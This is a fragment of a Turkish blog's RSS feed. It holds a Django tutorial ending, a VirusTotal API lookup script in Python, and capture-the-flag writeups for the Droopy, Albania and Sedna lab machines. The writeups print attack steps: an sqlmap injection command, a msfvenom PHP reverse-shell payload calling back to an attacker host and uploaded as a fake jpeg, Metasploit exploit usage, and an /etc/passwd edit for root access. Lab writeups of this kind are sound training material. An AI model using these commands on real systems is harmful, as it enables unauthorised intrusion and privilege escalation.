+&lt;p&gt;      Buradan girilen değer GET metodu ile &lt;code class=&quot;highlighter-rouge&quot;&gt;/get_string&lt;/code&gt; dizinine yani &lt;code class=&quot;highlighter-rouge&quot;&gt;get_string()&lt;/code&gt; fonksiyonuna gönderilecek. Bu yüzden &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/urls.py&lt;/code&gt; ve &lt;code class=&quot;highlighter-rouge&quot;&gt;reverseString/views.py&lt;/code&gt; altında düzenlemeler yapmamız gerekiyor. HTTP GET isteği yapıldığında &lt;code class=&quot;highlighter-rouge&quot;&gt;/get_string&lt;/code&gt; url’i biliniyor olmalı, bu yüzden aşağıdaki gibi url’i ekliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/urls.py
+from django.contrib import admin
+from django.conf.urls import url, include
+from reverseString.views import *
+
+urlpatterns = [
+    url('admin/', admin.site.urls),
+    url(r'^$', homepage),
+    url(r'^get_string/$', get_string),
+
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      URL dosyasına bakılıp karşılık gelen fonksiyonun &lt;code class=&quot;highlighter-rouge&quot;&gt;get_string()&lt;/code&gt; olduğu görüldüğünde view bölümünde aranacaktır. Buraya ilgili fonksiyonu ekledikten sonra string’imizi &lt;code class=&quot;highlighter-rouge&quot;&gt;reverse_string()&lt;/code&gt; fonksiyonuna yollayarak ters çevirme işlemini gerçekleştiriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#reverseString/views.py
+from django.shortcuts import render,HttpResponse
+
+def homepage(request):
+    return render(request,'home.html')
+
+
+def get_string(request):
+    text = request.GET['mystring']
+    text = reverse_string(text)
+    return HttpResponse(text)
+
+def reverse_string(text):
+    return text[::-1]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h3&gt;Sonuç&lt;/h3&gt;&lt;/center&gt;
+
+&lt;p&gt;      Girişin ilk aşamasında url oluşturma, view üzerinde metod tanımlama, template üzerinden gelen veriyi işleyerek geri gönderme ve temel konfigürasyonlar gibi işlemleri gerçekleştirmiş olduk. Bir sonraki django yazısında veritabanı ile ilgili işlemlerden bahsedeceğim.&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 02 Feb 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2018/02/02/django-giris-1.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2018/02/02/django-giris-1.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>HTTP Restful API ve Virus Total API (Python)</title>
+        <description>&lt;p&gt;      HTPP bir istek-yanıt protokolüdür. İnternet üzerinde bir uygulamaya gitmek için bir HTTP istek yaparız ve HTTP yanıt alırız. Bu yazıda Restful API üzerinde duracağız. Restful API, HTTP protokolünün bir formudur. Öncelikle API kavramından bahsedelim. API (Application Programming Interface), bir uygulama için oluşturulmuş bazı fonksiyonların, başka uygulamalar tarafından çağrılıp, kullanılabilmesine imkan veren, destekleyen yapılardır. Yazılımların birbirleriyle iletişim kurması için belirlenmiş kod dizisidir. API’leri bu yüzden arayüz gibi düşünebiliriz. Farklı yazılımların etkileşimini ve birbirine bağlanabilmesini sağlar. Peki bu Restful API nedir ?&lt;/p&gt;
+
+&lt;center&gt;&lt;h3&gt;Restful API&lt;/h3&gt;&lt;/center&gt;
+
+&lt;p&gt;      Restful API , internet üzerindeki uygulamalarda ve bulut iletişiminde yaygın olarak kullanılan, uygulama düzeyinde bir protokoldür. Stateless ve cacheless bir yapıdadır. Yapılan her istek benzersizdir. Gelen önceki ve gelebilecek sonraki istekten etkilenmez ve bağlantısı bulunmaz. İstemci-Sunucu bağımsızlığından ve HTTP ile çalıştığından dolayı uygun herhangi bir programlama dili ile test edilebilmektedir. Restful API’nin yapısı aşağıdaki bileşenlerden oluşur.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1. URL&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;2. HTTP METHODS&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;3. HEADERS&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;4. PARAMETERS&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;5. DATA&lt;/code&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;h5&gt;URL&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Uniform Resource Locator, kaynağın bulunduğu ve üzerinden işlemlerin gerçekleştirildiği yoldur. URL, kaynağa doğrudan işaret edebiliyorken, aynı zamanda farklı bir kaynağa veya işleme de yönlendirebilir.&lt;/p&gt;
+
+&lt;center&gt;&lt;h5&gt;HTTP METHODS&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      GET, POST, PUT, DELETE gibi metodlar ile gerçekleştirilen isteklerdir. Daha geniş bilgi için &lt;a href=&quot;http://127.0.0.1:4000/tr/2017/07/14/http.html&quot;&gt;buraya&lt;/a&gt;
+göz atabilirsiniz.&lt;/p&gt;
+
+&lt;h6&gt;GET&lt;/h6&gt;
+&lt;p&gt;Basit anlamda, kaynaktan veri talep ederken yapılan istektir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;requests.get(url)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h6&gt;POST&lt;/h6&gt;
+&lt;p&gt;      Sunucuya veri gönderip kaynak oluşturmayı hedeflerken kullandığımız HTTP metodudur.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;requests.post(url, data=data)	
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h6&gt;PUT&lt;/h6&gt;
+&lt;p&gt;      Sunucu üzerinde bulunan kaynağı güncellemeyi sağlayan HTTP metodudur.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;requests.put(url, params=params)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h6&gt;DELETE&lt;/h6&gt;
+&lt;p&gt;      Sunucu üzerinden kaynak silmeyi destekleyen yöntemdir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;requests.delete(url)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;HEADERS&lt;/h5&gt;&lt;/center&gt;
+
+&lt;p&gt;      İstek ve yanıtların içeriklerini işlemek için kullanılan bilgileri içerir. WEB servisi tarafından desteklenen veri tipleri ile ilgili bilgiler burada yer alır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{ 'Content-type' : 'text/html' }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;PARAMETERS&lt;/h5&gt;&lt;/center&gt;
+
+&lt;p&gt;      URL üzerinde parametre olarak değerlerin gönderildiği durumlar için, yapılan HTTP isteğinin içinde bu bölüm yer alır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{ 'apikey': api_key, 'resource': hash }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;DATA&lt;/h5&gt;&lt;/center&gt;
+
+&lt;p&gt;      İsteğin içinde gönderilecek veriler burada bulunur.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{ 'username' : user, 'password' : passwd }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h3&gt;Virus Total API - Python ile Hash ve URL Arama Örneği &lt;/h3&gt;&lt;/center&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	import requests
+
+	api_key = ''
+	hash = '7657fcb7d772448a6d8504e4b20168b8'
+	target_url = 'http://www.hakanbayir.com'
+
+	def hash_search():
+	    url = 'https://www.virustotal.com/vtapi/v2/file/report'
+	    parameters = {'apikey': api_key, 'resource': hash}
+	    headers = {&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;}
+
+	    r = requests.post(url, headers=headers, params=parameters)
+
+	    result = r.json()
+
+	    scanner = result['scans']
+
+	    scanner_count = 1
+	    for i in scanner:
+		     print scanner_count , &quot; : &quot;, i, &quot; - &quot; , scanner[i] , '\n'
+		     scanner_count = scanner_count + 1
+
+
+	def url_search():
+	    url = 'http://www.virustotal.com/vtapi/v2/url/report'
+	    parameters = {'apikey' : api_key , 'resource' : target_url}
+	    headers = {&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;}
+
+	    r = requests.post(url, headers=headers, params=parameters)
+
+	    result = r.json()
+
+	    scanner = result['scans']
+
+	    scanner_count = 1
+	    for i in scanner:
+		     print scanner_count , &quot; : &quot;, i, &quot; - &quot; , scanner[i] , '\n'
+		     scanner_count = scanner_count + 1
+
+
+	if __name__ == '__main__':
+	    print &quot;[1]. Hash Search&quot; , &quot;\n&quot;
+	    print &quot;[2]. URL Search&quot; , &quot;\n&quot;
+
+	    print &quot;Choose Search Options : &quot;
+	    option = raw_input()
+
+	    if option == '1':
+		     hash_search()
+	    elif option == '2':
+		     url_search()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Hash Arama Çıktısı&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;&lt;img src=&quot;/img/virustotal/hash_search.png&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;center&gt;&lt;h5&gt;URL Arama Çıktısı&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;&lt;img src=&quot;/img/virustotal/url_search.png&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 31 Jan 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2018/01/31/restful-api-virustotal-python.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2018/01/31/restful-api-virustotal-python.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>Droopy Writeup</title>
+        <description>&lt;p&gt;      Droopy makinesinin ağ üzerinde aldığı ip adresini bulmak için netdiscover aracı ile bir tarama başlatıyoruz. Hedefin aldığı ip adresi 192.168.0.30 olarak bulunuyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/netdiscover.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      İlgili ip adresi için nmap ile ulaşılabilir servislere yönelik bir tarama başlatıyoruz. Bu tarama sonucunda 80 portu üzerinden HTTP servisinin hizmet verdiğini görüyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/nmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Detaylı nmap taraması bize uygulamanın robots.txt dosyası bulundurduğunu da gösteriyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/robots-txt.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Daha fazla araç kullanmaya gerek kalmadan robots.txt dosyası üzerinde incelemeye başlıyoruz. İlgi çekici birçok dosya arasından &lt;code class=&quot;highlighter-rouge&quot;&gt;CHANGELOG.txt&lt;/code&gt; dosyasında bazı ipuçları olduğu keşfediliyor. Bu dosya ilgili uygulama hakkında versiyon bilgisi içeriyor. Burada bir bilgi sızdırmasından bahsedilebilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/changelog.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Uygulama ve versiyonu hakkında kısa bir araştırma yaptıktan sonra php üzerinden bir &lt;code class=&quot;highlighter-rouge&quot;&gt;sql injection&lt;/code&gt; zafiyeti olduğu gözlemleniyor. Bu zafiyetten yararlanılarak uygulama için yeni kullanıcılar oluşturulup , bu kullanıcılar ile sisteme giriş yapılabiliyor. Uygulama üzerinde yer alan kullanıcı sayfasında &lt;code class=&quot;highlighter-rouge&quot;&gt;Add Content&lt;/code&gt; diyerek &lt;code class=&quot;highlighter-rouge&quot;&gt;Basic Page&lt;/code&gt; seçeneğiyle bir php sayfası oluşturulabiliyor. &lt;code class=&quot;highlighter-rouge&quot;&gt;#2.Option&lt;/code&gt; Buraya yüklenen bir php reverse shell kodu bağlantıyı verecektir. Bunun yanı sıra metasploit üzerindeki exploit için bu seçenek otomatize hale getirilmiştir ve kullanıcı oluşturduktan sonra bağlantıyı vermektedir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/drupal-exploit.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sisteme erişim sağlandıktan sonra www-data kullanıcısı olarak içeride olduğumuzu görüyoruz. Güncel olmayan &lt;code class=&quot;highlighter-rouge&quot;&gt;13.03&lt;/code&gt; sürümünün zafiyetinin istismarı sonucu hedef üzerinde yetki yükseltme işlemi gerçekleştiriyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/root-exploit.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h3&gt;#2. Option&lt;/h3&gt;
+
+&lt;p&gt;      Burada alınan kullanıcı adları ile sisteme girip manuel bağlantı alma konusundan bahsedilecektir. Exploiti kullanarak user:password ikilisini &lt;code class=&quot;highlighter-rouge&quot;&gt;ZxgKSjgYki:mEGAEYFYrG&lt;/code&gt; olarak inject etmiş bulunuyoruz. Bu bilgiler ile uygulamaya giriş yapacağız. Sonrasında kullanıcı
+panelinde sayfa oluşturma özelliğini kullanacağız.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/drupal-panel.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Burada eklenen reverse shell kodu ile bağlantı alınmıştır. Aynı işlemleri tekrarlayarak yetki yükseltme gerçekleştirilmiştir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/droopy/panel-root.png&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 15 Jan 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2018/01/15/droopy.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2018/01/15/droopy.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>Albania Writeup</title>
+        <description>&lt;p&gt;      Albania sunucusunun ağ üzerindeki aldığı ip adresini bulmak için netdiscover ile tarama başlatıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netdiscover -r 192.168.0.0/24 -i enp2s0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/netdiscover.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sunucunun ip adresi tespit edildikten sonra nmap ile servislere yönelik detaylı bir tarama gerçekleştirilmiştir. Burada 22 numaralı port üzerinde SSH ve 8008 numaralı port üzerinde HTTP-Apache servisleri çalışmaktadır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A -T4 192.168.0.30
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/nmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Aynı zamanda bu tarama sonucunda uygulamaya ait &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; dosyasının varlığı da tespit edilmiştir. İçerisinde disallow edilmiş karışık isimli birçok dizin bulunmaktadır.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/robots-txt.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu dizinlerin herbirine tek tek bakmak yerine otomatize çalışan basit bir script hazırladım. Bu script dizinleri alıp herbirine istek yapacak ve content-length dönüşü yapacak. Buradan farklı olan dizin tespit edilmeye çalışılacaktır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.	#!/bin/bash
+2.
+3.	GET http://192.168.0.30:8008/robots.txt | awk '{print $2}' &amp;gt; directories.txt
+4.	while read p; do
+5.	  echo &quot;******************&quot;
+6.	  echo $p . &quot; : &quot; 
+7.	  HEAD http://192.168.0.30:8008/$p | grep Content-Length
+8.	  echo &quot;******************&quot;
+9.	done &amp;lt;directories.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/script.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Buradan aradığımız dizinin &lt;code class=&quot;highlighter-rouge&quot;&gt;/unisxcudkqjydw/&lt;/code&gt; olduğunu tespit ediyoruz. Bu hedefe gittiğimizde bize farklı bir dizin ile ilgili ipucu veriliyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/secret-dir.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu kadar işlemin ardından artık ulaşmamız gereken sayfayı buluyoruz: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.0.30:8008/unisxcudkqjydw/vulnbank/client/login.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/vulnbank.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Kullanıcı girişi gerektiren bu sayfa &lt;code class=&quot;highlighter-rouge&quot;&gt;time based sql injection&lt;/code&gt; zafiyeti bulunduruyor. Bunu birçok denemenin ardından anlıyoruz. Sqlmap aracı ile aşağıdaki komutu çalıştırdığımızda işimize yarayacak olan payload’ı elde etmiş oluyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://192.168.0.30:8008/unisxcudkqjydw/vulnbank/client/login.php&quot; --data &quot;username=ctrl*&amp;amp;password=ctrl&quot; --random-agent --risk 3 --level 5 --technique T
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/sqlmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sayfaya giriş yaptıktan sonra resim yükleyebildiğimiz bir anasayfa açılıyor. Bu sayfa üzerinde PHP reverse shell kodumuzu jpeg uzantısıyla upload ediyoruz. Herhangi bir sorun olmadan kodumuz yükleniyor ve bize meterpreter oturumunu getiriyor. PHP kodunu &lt;code class=&quot;highlighter-rouge&quot;&gt;Msfvenom&lt;/code&gt; ile aşağıdaki gibi hazırlıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.35 LPORT=6666 -f raw &amp;gt; php-reverse-shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/upload.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      İçeriye &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; kullanıcısı olarak giriş yaptık. Kernel seviyesinde bir exploitation gerçekleştiremeyeceğimizi anladıktan sonra sistem içerisinde araştırma yapmaya başlıyoruz. Öncelikle sistem üzerinde bulunan suid bitli dosyaları araştırıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/meterpreter.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
+find / -perm -u=s&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu işlem sonucunda &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; binary dosyasının normal yetkili sistem kullanıcıları tarafından çalıştırılabildiğini görüyoruz. Bildiğimiz üzere &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt;(switch user) komutu ile parolası bilinen bir kullanıcı yetkili giriş yapıp root yetkilerini elde edebilir. Bu yüzden parolası bilinen bir kullanıcı bulmayı hedefliyoruz. Sistemde araştırma yapmaya devam ederken passwd dosyasını da yazma yetkimizin olduğunu görüyoruz. Buraya taviso için bir parola tanımlayabiliriz.Bu işlem için &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; içerik yapısını hatırlayalım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username:password:1000:1000::/home/username:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Buraya uygun olacak bir parola üretiyoruz. Devamında taviso için içerik yapısını oluşturalım. Sonrasında passwd dosyasını aşağıdaki gibi düzenliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl passwd -1 
+taviso:$1$yWRbfixX$VMYDiLLYrVHBjJ/lX5uc8/:1000:1000:Taviso,,,:/home/taviso:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/meterpreter-passwd.png&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;su taviso
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      komutu ile parola girdikten sonra taviso kullanıcısı olarak sisteme erişmiş bulunuyoruz. Su komutunu kullanabilme hakkımızdan dolayı artık hedef kullanıcının yani root kullanıcısının parolasını bilmesekte geçiş yapabiliyoruz. Bu sayede root haklarını elde etmiş olduk.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/albania/root.png&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 15 Jan 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2018/01/15/albania.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2018/01/15/albania.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>Hackfest2016 - Sedna Writeup</title>
+        <description>&lt;p&gt;      Sedna makinesi, herhangi bir tarama gerektirmeden, aldığı ip adresini bize doğrudan veriyor. Makine başladığında CLI’da ip adresi 192.168.0.113 olarak görünüyor. Bu bilgiden yola çıkarak bir nmap taraması başlatıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -A -T4 192.168.0.113
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sedna/nmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      80 portu üzerinde çalışan web uygulamayı gördükten sonra tarayıcından  http://192.168.0.113 adresine gidiyoruz. Burada gözümüze çarpan pek bir şey olmuyor. Dirb aracı ile işimize yarayacak farklı dizinler bulmayı hedefliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirb http://192.168.0.113
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sedna/dirb.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Buradan gelen dizinleri dolaşırken bazı CSS vb. metin dosyaları görüyoruz. Bu dosyaları okurken içerisinde versiyon, kullanılan teknoloji vb gibi bilgiler bulmayı hedefliyoruz. Gözümüze bir anahtar kelime takılıyor: &lt;code class=&quot;highlighter-rouge&quot;&gt;BuilderEngine&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sedna/builderengine.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu teknoloji ile ilgili neler çıkabilir diye google’da arattığımızda uygulamanın zafiyet bulundurduğunu ve hazır bir exploitinin de bulunduğunu görüyoruz. BuilderEngine 3.5.0 sürümü,  &lt;code class=&quot;highlighter-rouge&quot;&gt;Arbitrary File Upload&lt;/code&gt; zafiyeti bulunduruyormuş. Bu sayede upload ettiğimiz zararlı kod ile bir reverse shell bağlantısı almayı hedefliyoruz. Metasploit üzerinde şöyle bir exploit kodu olduğu da gözümüze çarpıyor :  &lt;code class=&quot;highlighter-rouge&quot;&gt;BuilderEngine Arbitrary File Upload and Execution&lt;/code&gt;. Bu exploit kodu ile hedef sistemden bağlantı almayı hedefliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use use exploit/multi/http/builderengine_upload_exec
+set rhost 192.168.0.113
+run 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sedna/shell.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu işlem sonucu www-data kullanıcısı olarak içerdeyiz. Local exploit aramaktan, suid bitli dosyalara bakmaya kadar bir çok araştırma yaptıktan sonra ilginç dosyaları teker teker araştırmaya başladım. Saatler sonra &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/chkrootkit&lt;/code&gt; dizini gözüme çarpanlar arasında oldu. README dosyasını okuduğumuzda versiyon bilgisine ulaşacağız.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sedna/chkrootkit-version.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Bu versiyon ile ilgili google araması yaptığımızda &lt;code class=&quot;highlighter-rouge&quot;&gt;Chkrootkit 0.49 - Local Privilege Escalation&lt;/code&gt; sonucuna ulaşıyoruz.  Metasploit üzerinde exploit’i bulup seçenekleri aşağıdaki gibi düzenliyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sedna/chkrootkit-options.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;      Sedna üzerinde yetki yükseltme işlemi böylece tamamlanmış oluyor. Chkrootkit 0.50 sürümünden önce, /tmp/update adlı bir çalıştırılabilir dosya, root olarak çalıştırılır ve bunun sayesinde bir yetki yükseltme sağlanmıştır.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/sedna/root.png&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 13 Dec 2017 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2017/12/13/sedna.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2017/12/13/sedna.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>Mr. Robot 1 Writeup</title>
